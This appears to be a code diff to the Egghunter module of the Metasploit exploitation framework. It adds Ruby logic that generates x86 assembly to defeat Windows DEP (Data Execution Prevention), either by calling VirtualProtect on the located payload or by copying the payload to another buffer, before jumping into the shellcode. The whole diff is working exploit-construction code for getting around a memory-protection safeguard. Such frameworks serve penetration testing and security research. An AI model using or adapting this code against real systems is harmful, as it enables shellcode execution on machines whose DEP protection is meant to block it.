@@ -20,6 +20,7 @@ module Exploitation
 # Checksum code merged to Egghunter by jduck
 # Conversion to use Metasm by jduck
 # Startreg code added by corelanc0d3r
+# Added routine to disable DEP for discovered egg (for win, added by corelanc0d3r)
 #
 ###
 class Egghunter
@@ -57,7 +58,95 @@ class Egghunter
 				end
 				startstub << "\n\t" if startstub.length > 0
 
+				getpointer = ''
+				getsize = ''
+				getpc = ''
+				jmppayload = "jmp edi"
+
+				apireg = opts[:depreg].downcase || 'esi'
+				apidest = opts[:depdest]
+				depsize = opts[:depsize]
+
+				freeregs = [ "esi", "ebp", "ecx", "ebx" ]
+
+				if opts[:depmethod]
+
+					if freeregs.index(apireg) == nil
+						getpointer << "mov #{freeregs[0]},#{apireg}\n\t"
+						apireg = freeregs[0]
+					end
+					freeregs.delete(apireg)
+
+					if opts[:depmethod].downcase == "copy" || opts[:depmethod].downcase == "copy_size"
+						if apidest
+							if freeregs.index(apidest) == nil
+								getpointer << "mov #{freeregs[0]},#{apidest}\n\t"
+								apidest = freeregs[0]
+							end
+						else
+							getpc = "fldpi\n\tfstenv [esp-0xc]\n\tpop #{freeregs[0]}\n\t"
+							apidest = freeregs[0]
+						end
+						freeregs.delete(apidest)
+					end
+
+
+					sizereg = freeregs[0]
+
+					if not depsize
+						depsize = payload.length * 2
+						if opts[:depmethod]
+							if opts[:depmethod].downcase == "copy_size" 
+								depsize = payload.length
+							end
+						end
+					end
+
+
+					blockcnt = 0
+					vpsize = 0
+					blocksize = depsize
+					while blocksize >= 127
+						blocksize = blocksize / 2
+						blockcnt += 1
+					end
+					if blockcnt > 0
+						getsize << "xor #{sizereg},#{sizereg}\n\tadd #{sizereg},0x%02x\n\t" % blocksize
+						vpsize = blocksize
+						depblockcnt = 0
+						while depblockcnt < blockcnt
+							getsize << "add #{sizereg},#{sizereg}\n\t"	
+							vpsize += vpsize						
+							depblockcnt += 1
+						end
+						delta = depsize - vpsize
+						if delta > 0
+							getsize << "add #{sizereg},0x%02x\n\t" % delta
+						end
+					else
+						getsize << "xor #{sizereg},#{sizereg}\n\tadd #{sizereg},0x%02x\n\t" % depsize	
+					end
+				
+
+					case opts[:depmethod].downcase
+						when "virtualprotect"
+							jmppayload = "push esp\n\tpush 0x40\n\t"
+							jmppayload << getsize
+							jmppayload << "push #{sizereg}\n\tpush edi\n\tpush edi\n\tpush #{apireg}\n\tret"
+						when "copy"
+							jmppayload = getpc
+							jmppayload << "push edi\n\tpush #{apidest}\n\tpush #{apidest}\n\tpush #{apireg}\n\tmov edi,#{apidest}\n\tret"
+						when "copy_size"
+							jmppayload = getpc
+							jmppayload << getsize
+							jmppayload << "push #{sizereg}\n\tpush edi\n\tpush #{apidest}\n\tpush #{apidest}\n\tpush #{apireg}\n\tmov edi,#{apidest}\n\tret"
+					end
+				end
+
+				jmppayload << "\n" if jmppayload.length > 0
+
 				assembly = <<EOS
+#{getpointer}				
 #{startstub}
 check_readable:
 	or dx,0xfff
@@ -84,7 +173,7 @@ check_for_tag:
 #{checksum}
 
 	; jump to the payload
-	jmp edi
+	#{jmppayload}
 EOS
 
 				assembled_code = Metasm::Shellcode.assemble(Metasm::Ia32.new, assembly).encode_string
